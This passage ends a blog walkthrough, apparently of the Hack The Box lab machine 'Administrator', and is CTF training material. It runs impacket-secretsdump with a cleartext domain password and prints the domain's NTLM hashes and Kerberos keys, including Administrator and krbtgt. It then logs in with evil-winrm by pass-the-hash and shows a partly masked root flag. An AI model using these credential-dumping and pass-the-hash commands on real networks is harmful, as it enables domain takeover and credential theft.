+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator/targetedKerberoast<span style="color:#f92672">]</span>
+└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb<span style="color:#ae81ff">\o</span>livia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb<span style="color:#ae81ff">\m</span>ichael:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+administrator.htb<span style="color:#ae81ff">\b</span>enjamin:1110:aad3b435b51404eeaad3b435b51404ee:7bbaa07b15a7a7695e673f201df89dcf:::
+administrator.htb<span style="color:#ae81ff">\e</span>mily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb<span style="color:#ae81ff">\e</span>than:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb<span style="color:#ae81ff">\a</span>lexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb<span style="color:#ae81ff">\e</span>mma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+-----------------------------------
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
+
+</code></pre></div><p><img src="attachment/5833028285c077c9ac819c7c344474ef.png" alt=""></p>
+<p>Use Administrator&rsquo;s to login trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+</code></pre></div><p><img src="attachment/75408c8efcfc4c77cc3662797fb2cf2f.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:233992c6cab2f94************
+</code></pre></div>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1182 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-11-26 01:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Administrator&amp;caption=HTB%3a%20Administrator&amp;canonicalUrl=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Administrator&amp;body=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f&amp;media=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f;description=HTB%3a%20Administrator" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f&amp;title=HTB%3a%20Administrator&amp;summary=HTB%3a%20Administrator&amp;source=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f&amp;resubmit=true&amp;title=HTB%3a%20Administrator" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f;title=HTB%3a%20Administrator" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Administrator%20https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f&amp;t=HTB%3a%20Administrator" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Administrator&amp;url=https%3a%2f%2fv3l1d.github.io%2fposts%2fadministrator%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://v3l1d.github.io/posts/trickster/">
+                    <span class="button__text">HTB: Trickster</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.644292943ae47eef02fcd64b11757aeb8caeeaebf473a823b62099edccac808e8d82689359f285e5d95994e5ad5ae3b9c1ccc281eb1828e67d0ba6630f95b832.js" integrity="sha512-ZEKSlDrkfu8C/NZLEXV664yu6uv0c6gjtiCZ7cysgI6NgmiTWfKF5dlZlOWtWuO5wczCgesYKOZ9C6ZjD5W4Mg=="></script>
+
+
+
+
+
+    </body>
+</html>
